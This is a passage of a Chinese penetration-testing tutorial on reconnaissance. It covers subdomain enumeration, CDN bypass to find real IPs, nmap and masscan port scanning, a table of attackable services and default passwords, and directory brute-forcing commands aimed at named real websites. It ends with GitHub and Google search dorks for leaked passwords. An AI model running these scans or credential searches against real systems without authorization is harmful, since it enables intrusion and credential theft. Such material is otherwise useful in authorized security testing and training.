site=域名即可 <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br>FOFA搜索子域名，fofa直接输入 domain=”baidu.com” <a href="https://fofa.so/">https://fofa.so/</a><br>子域名在线查询 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a>   <a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a><br>ip183 <a href="https://site.ip138.com/acbug.cn/">https://site.ip138.com/acbug.cn/</a> 可查询子域名、ip、备案等。<br>Hackertarget查询子域名 <a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a> 注意：通过该方法查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。<br>360测绘空间 <a href="https://quake.360.cn/">https://quake.360.cn/</a> <code>domain:&quot;*.freebuf.com&quot;</code></p><h4 id="工具软件："><a href="#工具软件：" class="headerlink" title="工具软件："></a>工具软件：</h4><p>Layer子域名挖掘机、SubDomainBrute、Sublist3r等等<br>提示：以上方法为爆破子域名，由于字典比较强大，所以效率较高，很依赖字典。</p><p>OneForALL（强推）<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --user -r requirements.txt -i [https://mirrors.aliyun.com/pypi/simple/](https://mirrors.aliyun.com/pypi/simple/)</span><br><span class="line"></span><br><span class="line">python3 oneforall.py --target baidu.com run /*收集*/</span><br><span class="line"></span><br><span class="line">爆破子域名</span><br><span class="line"></span><br><span class="line">Example：</span><br><span class="line"></span><br><span class="line">brute.py --target domain.com --word True run</span><br><span class="line">brute.py --targets ./domains.txt --word True run</span><br><span class="line">brute.py --target domain.com --word True --concurrent 2000 run</span><br><span class="line">brute.py --target domain.com --word True --wordlist subnames.txt run</span><br><span class="line">brute.py --target domain.com --word True --recursive True --depth 2 run</span><br><span class="line">brute.py --target d.com --fuzz True --place m.*.d.com --rule &#x27;[a-z]&#x27; run</span><br><span class="line">brute.py --target d.com --fuzz True --place m.*.d.com --fuzzlist subnames.txt run</span><br></pre></td></tr></table></figure><br>Wydomain<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsburte.py -d aliyun.com -f dnspod.csv -o aliyun.log</span><br><span class="line">wydomain.py -d aliyun.com</span><br></pre></td></tr></table></figure><br>FuzzDomain</p><h5 id="隐藏域名hosts碰撞"><a href="#隐藏域名hosts碰撞" class="headerlink" title="隐藏域名hosts碰撞"></a>隐藏域名hosts碰撞</h5><p>隐藏资产探测-hosts碰撞 <a href="https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</a><br>很多时候访问目标资产IP响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止IP直接访问），因为这大多数都是需要绑定host才能正常请求访问的 （目前互联网公司基本的做法）（域名删除了A记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的 域名 和 目标资产 的IP段组合起来，以 IP段+域名 的形式进行捆绑碰撞，就能发现很多有意思的东西。</p><p>在发送http请求的时候，对域名和IP列表进行配对，然后遍历发送请求 （就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回 来做对比，即可快速发现一些隐蔽的资产。</p><p>进行hosts碰撞需要目标的域名和目标的相关IP作为字典</p><p>域名就不说了</p><p>相关IP来源有：</p><p>目标域名历史解析IP<br><a href="https://site.ip138.com/">https://site.ip138.com/</a><br><a href="https://ipchaxun.com/">https://ipchaxun.com/</a><br>ip正则<br><a href="https://www.aicesu.cn/reg/">https://www.aicesu.cn/reg/</a></p><h3 id="SSL-TLS证书查询"><a href="#SSL-TLS证书查询" class="headerlink" title="SSL/TLS证书查询"></a>SSL/TLS证书查询</h3><p>SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。(强推)</p><p><a href="https://myssl.com/">https://myssl.com/</a><br><a href="https://crt.sh">https://crt.sh</a><br><a href="https://censys.io">https://censys.io</a><br><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p><p>SSL证书搜索引擎：</p><p><a href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a><br><a href="https://crt.sh/?Identity=%.moonsec.com">https://crt.sh/?Identity=%.moonsec.com</a><br><a href="https://censys.io/">https://censys.io/</a><br>GetDomainsBySSL.py</p><h2 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h2><p>如果目标网站使用了CDN，使用了cdn真实的ip会被隐藏，如果要查找真实的服务器就必须获取真实的ip，根据这个ip继续查询旁站。</p><p>注意：很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实ip也是一种途径。</p><h3 id="cdn探测"><a href="#cdn探测" class="headerlink" title="cdn探测"></a>cdn探测</h3><p>超级Ping<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://www.17ec.com/">http://www.17ec.com/</a></p><h3 id="绕过cdn找真实ip"><a href="#绕过cdn找真实ip" class="headerlink" title="绕过cdn找真实ip"></a>绕过cdn找真实ip</h3><h4 id="查询历史DNS解析记录"><a href="#查询历史DNS解析记录" class="headerlink" title="查询历史DNS解析记录"></a>查询历史DNS解析记录</h4><p>在查询到的历史解析记录中，最早的历史解析ip很有可能记录的就是真实ip，快速查找真实IP推荐此方法，但并不是所有网站都能查到。</p><p>DNSDB <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>viewdns <a href="https://viewdns.info/">https://viewdns.info/</a><br>微步在线 <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>Ipip.net <a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h4 id="找文件"><a href="#找文件" class="headerlink" title="找文件"></a>找文件</h4><p>如果目标网站存在phpinfo泄露等，可以在phpinfo中的SERVER_ADDR或_SERVER[“SERVER_ADDR”]找到真实ip</p><h4 id="子域名解析"><a href="#子域名解析" class="headerlink" title="子域名解析"></a>子域名解析</h4><p>通过寻找子域名再通过子域名查询解析的服务器的P可以是真实的服务器<br>在线子域名查询<br><a href="https://securitytrails.com/list/apex_domain/t00ls.net">https://securitytrails.com/list/apex_domain/t00ls.net</a><br><a href="http://tool.chinaz.com/subdomain/t00ls.net">http://tool.chinaz.com/subdomain/t00ls.net</a><br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>找到子域名继续确认子域名没有cdn的情况下批量进行域名解析查询，有cdn的情况继续查询历史。<br>域名批量解析<br><a href="http://tools.bugscaner.com/domain2ip.html">http://tools.bugscaner.com/domain2ip.html</a></p><h4 id="邮件发送"><a href="#邮件发送" class="headerlink" title="邮件发送"></a>邮件发送</h4><p>如果网站有邮箱发送功能可以试，再密码找回邮箱头文件可能是服务器的真实ip。</p><h3 id="国外dns获取真实IP"><a href="#国外dns获取真实IP" class="headerlink" title="国外dns获取真实IP"></a>国外dns获取真实IP</h3><p>部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP</p><p>全世界DNS地址：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://www.ab173.com/dns/dns_world.php</span><br><span class="line">https://dnsdumpster.com/</span><br><span class="line">https://dnshistory.org/</span><br><span class="line">http://whoisrequest.com/history/</span><br><span class="line">https://completedns.com/dns-history/</span><br><span class="line">http://dnstrails.com/</span><br><span class="line">https://who.is/domain-history/</span><br><span class="line">http://research.domaintools.com/research/hosting-history/ http://site.ip138.com/</span><br><span class="line">http://viewdns.info/iphistory/</span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://www.virustotal.com/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://viewdns.info/</span><br><span class="line">http://www.17ce.com/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url= https://securitytrails.com/</span><br><span class="line">https://tools.ipip.net/cdn.php</span><br></pre></td></tr></table></figure><br>还要利用ssl证书，fofa等就不再叙述了。<br>绕过CDN的多种方法具体可以参考 <a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p><h3 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a>在线端口检测</h3><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><h3 id="端口扫描器"><a href="#端口扫描器" class="headerlink" title="端口扫描器"></a>端口扫描器</h3><p>msscan端口扫描 <a href="https://gitee.com/youshusoft/GoScanner/">https://gitee.com/youshusoft/GoScanner/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msscan -p 1-65535 ip --rate=1000</span><br></pre></td></tr></table></figure><p>nmap扫描端口和探测端口信息<br>常用参数，如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -sT 92.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -Pn -A -sC 192.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -sU -sT -p0-65535 192.168.122.1</span><br><span class="line"></span><br><span class="line">用于扫描目标主机服务版本号与开放的端口</span><br><span class="line"></span><br><span class="line">如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</span><br><span class="line"></span><br><span class="line">nmap -iL ip.txt</span><br><span class="line"></span><br><span class="line">来扫描列表中所有的ip。</span><br></pre></td></tr></table></figure><br>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。<br>还有御剑，zmap等</p><h3 id="渗透端口"><a href="#渗透端口" class="headerlink" title="渗透端口"></a>渗透端口</h3><p>21,22,23,1433,152,3306,3389,5432,5900,50070,50030,50000,27017,27018,11211,9200,9300,7001,7002,6379,5984,873,443,8000-9090,80-89,80,10000,8888,8649,8083,8080,8089,9090,7778,7001,7002,6082,5984,4440,3312,3311,3128,2601,2604,2222,2082,2083,389,88,512,513,514,1025,111,1521,445,135,139,53</p><h4 id="渗透常见端口及对应服务"><a href="#渗透常见端口及对应服务" class="headerlink" title="渗透常见端口及对应服务"></a>渗透常见端口及对应服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">1.web类(web漏洞/敏感目录)</span><br><span class="line"></span><br><span class="line">第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</span><br><span class="line">80 web</span><br><span class="line">80-89 web</span><br><span class="line">8000-9090 web</span><br><span class="line"></span><br><span class="line">2.数据库类(扫描弱口令)</span><br><span class="line"></span><br><span class="line">1433 MSSQL</span><br><span class="line">1521 Oracle</span><br><span class="line">3306 MySQL</span><br><span class="line">5432 PostgreSQL</span><br><span class="line"></span><br><span class="line">3.特殊服务类(未授权/命令执行类/漏洞)</span><br><span class="line"></span><br><span class="line">443 SSL心脏滴血</span><br><span class="line">873 Rsync未授权</span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/</span><br><span class="line">6379 redis未授权</span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列</span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="line">11211 memcache未授权访问</span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line">50000 SAP命令执行</span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"></span><br><span class="line">4.常用端口类(扫描弱口令/端口爆破)</span><br><span class="line"></span><br><span class="line">21 ftp</span><br><span class="line">22 SSH</span><br><span class="line">23 Telnet</span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3389 远程桌面</span><br><span class="line"></span><br><span class="line">5.端口合计详情</span><br><span class="line"></span><br><span class="line">21 ftp</span><br><span class="line">22 SSH</span><br><span class="line">23 Telnet</span><br><span class="line">80 web</span><br><span class="line">80-89 web</span><br><span class="line">161 SNMP</span><br><span class="line">389 LDAP</span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试</span><br><span class="line">445 SMB</span><br><span class="line">512,513,514 Rexec</span><br><span class="line">873 Rsync未授权</span><br><span class="line">1025,111 NFS</span><br><span class="line">1433 MSSQL</span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778)</span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多）</span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><span class="line">3306 MySQL</span><br><span class="line">3312/3311 kangle主机管理系统登陆</span><br><span class="line">3389 远程桌面</span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</span><br><span class="line">5432 PostgreSQL</span><br><span class="line">5900 vnc</span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/</span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><span class="line">6379 redis未授权</span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列</span><br><span class="line">7778 Kloxo主机控制面板登录</span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</span><br><span class="line">8080 tomcat/WDCP主机管理系统，默认弱口令</span><br><span class="line">8080,8089,9090 JBOSS</span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多）</span><br><span class="line">8649 ganglia</span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口</span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统</span><br><span class="line">11211 memcache未授权访问</span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line">28017 mongodb统计页面</span><br><span class="line">50000 SAP命令执行</span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure><h4 id="常见的端口和攻击方法"><a href="#常见的端口和攻击方法" class="headerlink" title="常见的端口和攻击方法"></a>常见的端口和攻击方法</h4><p><img src="https://s2.loli.net/2023/10/02/9cGYJ3sOfTRaXM8.png" alt="image.png"></p><h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><p>如果想要在短时间内快速收集资产，那么利用网络空间搜索引擎是不错的选择，可以直观地看到旁站，端口，站点标题，IP等信息，点击列举出站点可以直接访问，以此来判断是否为自己需要的站点信息。FOFA的常用语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、同IP旁站：ip=&quot;192.168.0.1&quot;</span><br><span class="line">2、C段：ip=&quot;192.168.0.0/24&quot;</span><br><span class="line">3、子域名：domain=&quot;baidu.com&quot;</span><br><span class="line">4、标题/关键字：title=&quot;百度&quot;</span><br><span class="line">5、如果需要将结果缩小到某个城市的范围，那么可以拼接语句</span><br><span class="line"> title=&quot;百度&quot;&amp;&amp; region=&quot;Beijing&quot;</span><br><span class="line">6、特征：body=&quot;百度&quot;或header=&quot;baidu&quot;</span><br></pre></td></tr></table></figure><h2 id="扫描敏感目录-文件"><a href="#扫描敏感目录-文件" class="headerlink" title="扫描敏感目录/文件"></a>扫描敏感目录/文件</h2><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一半交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p><h4 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h4><p>御剑 <a href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a><br>7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a><br>1bbscan <a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用示例：</span><br><span class="line">1. 扫描单个web服务 www.target.com</span><br><span class="line">python BBScan.py  --host [www.target.com](http://www.target.com)</span><br><span class="line">2. 扫描www.target.com和www.target.com/28下的其他主机</span><br><span class="line">python BBScan.py  --host www.target.com --network 28</span><br><span class="line">3. 扫描txt文件中的所有主机</span><br><span class="line">python BBScan.py -f wandoujia.com.txt</span><br><span class="line">4. 从文件夹中导入所有的主机并扫描</span><br><span class="line">python BBScan.py -d targets/</span><br></pre></td></tr></table></figure><p>–network 参数用于设置子网掩码，小公司设为28~30，中等规模公司设置26~28，大公司设为24~26<br>当然，尽量避免设为24，扫描过于耗时，除非是想在各SRC多刷几个漏洞。<br>该插件是从内部扫描器中抽离出来的，感谢 Jekkay Hu<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x33;&#x34;&#x35;&#x33;&#x38;&#x39;&#56;&#48;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#x33;&#x34;&#x35;&#x33;&#x38;&#x39;&#56;&#48;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a></p><p>如果你有非常有用的规则，请找几个网站验证测试后，再 pull request</p><p>脚本还会优化，接下来的事：增加有用规则，将规则更好地分类，细化，后续可以直接从rules\request 文件夹中导入HTTP_request，优化扫描逻辑</p><p>dirmap <a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单个目标</span><br><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br><span class="line">多个目标</span><br><span class="line">python3 dirmap.py -iF urls.txt -lcf</span><br></pre></td></tr></table></figure><p>dirsearch <a href="https://gitee.com/Abaomianguan/dirsearch.git">https://gitee.com/Abaomianguan/dirsearch.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://m.scabjd.com/ -e *</span><br></pre></td></tr></table></figure><p>gobuster</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gobuster</span><br><span class="line"></span><br><span class="line">gobuster dir -u https://www.servyou.com.cn/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50</span><br><span class="line"></span><br><span class="line">dir -u 网址 w字典 -x 指定后缀 -t 线程数量</span><br><span class="line"></span><br><span class="line">dir -u https://www.servyou.com.cn/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;php,html,rar,zip&quot; -d --wildcard -o servyou.log | grep ^&quot;3402&quot;</span><br></pre></td></tr></table></figure><h3 id="敏感网站文件"><a href="#敏感网站文件" class="headerlink" title="敏感网站文件"></a>敏感网站文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. robots.txt</span><br><span class="line">2. crossdomin.xml</span><br><span class="line">3. sitemap.xml</span><br><span class="line">4. 后台目录</span><br><span class="line">5. 网站安装包</span><br><span class="line">6. 网站上传目录</span><br><span class="line">7. mysql管理页面</span><br><span class="line">8. phpinfo</span><br><span class="line">9. 网站文本编辑器</span><br><span class="line">10. 测试文件</span><br><span class="line">11. 网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</span><br><span class="line">12. DS_Store 文件</span><br><span class="line">13. vim编辑器备份文件(.swp)</span><br><span class="line">14. WEB—INF/web.xml文件</span><br><span class="line">15 .git</span><br><span class="line">16 .svn</span><br><span class="line">https://www.secpulse.com/archives/55286.html</span><br></pre></td></tr></table></figure><h3 id="扫描网页备份"><a href="#扫描网页备份" class="headerlink" title="扫描网页备份"></a>扫描网页备份</h3><p>例如<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line">config.php~</span><br><span class="line">config.php.bak</span><br><span class="line">config.php.swp</span><br><span class="line">config.php.rar</span><br><span class="line">conig.php.tar.gz</span><br><span class="line">www.zip</span><br></pre></td></tr></table></figure></p><h2 id="网站头信息收集"><a href="#网站头信息收集" class="headerlink" title="网站头信息收集"></a>网站头信息收集</h2><p>1、中间件 ：web服务【Web Servers】 apache iis7 iis7.5 iis8 nginx WebLogic tomcat<br>2.、网站组件： js组件jquery、vue  页面的布局bootstrap</p><p>在线查询<br><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>火狐的插件 Wappalyzer（力推）</p><h2 id="敏感文件搜索"><a href="#敏感文件搜索" class="headerlink" title="敏感文件搜索"></a>敏感文件搜索</h2><h3 id="GitHub搜索"><a href="#GitHub搜索" class="headerlink" title="GitHub搜索"></a>GitHub搜索</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">in:name baidu              #标题搜索含有关键字baidu</span><br><span class="line">in:descripton baidu         #仓库描述搜索含有关键字</span><br><span class="line">in:readme baidu             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 baidu           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 baidu      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 baidu           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 baidu      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 baidu           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 baidu    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 baidu   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:name                  #用户名搜素</span><br><span class="line">license:apache-2.0 baidu    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java baidu         #在java语言的代码中搜索关键字</span><br><span class="line">user:baidu in:name baidu     #组合搜索,用户名baidu的标题含有baidu的</span><br><span class="line">等等..</span><br></pre></td></tr></table></figure><p>github文档:<br><a href="https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories">https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories</a></p><p>搜索某些系统的密码<br><a href="https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a></p><p>github 关键词监控<br><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">谷歌搜索</span><br><span class="line"></span><br><span class="line">site:Github.com sa password</span><br><span class="line">site:Github.com root password</span><br><span class="line">site:Github.com User ID=&#x27;sa&#x27;;Password</span><br><span class="line">site:Github.com inurl:sql</span><br><span class="line"></span><br><span class="line">SVN 信息收集</span><br><span class="line"></span><br><span class="line">site:Github.com svn</span><br><span class="line">site:Github.com svn username</span><br><span class="line">site:Github.com svn password</span><br><span class="line">site:Github.com svn username password</span><br><span class="line"></span><br><span class="line">综合信息收集</span><br><span class="line"></span><br><span class="line">site:Github.com password</span><br><span class="line">site:Github.com ftp ftppassword</span><br><span class="line">site:Github.com 密码</span><br><span class="line">site:Github.com 内部</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a><br><a href="http://www.361way.com/github-hack/6284.html">http://www.361way.com/github-hack/6284.html</a><br><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</a><br><a href="https://github.com/search?q=smtp+bilibili.com&amp;type=code">https://github.com/search?q=smtp+bilibili.com&amp;type=code</a></p><h3 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google-hacking"></a>Google-hacking</h3><p>site: 域名<br>inurl: url中存在的关键字网页<br>intext：网页正文中的关键词<br>filetype: 指定文件类型</p><h3 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h3><p>cnvd vuldb cve 等等<br><a href="https://wooyun.website/">https://wooyun.website/</a></p><h3 id="网盘搜索"><a href="#网盘搜索" class="headerlink" 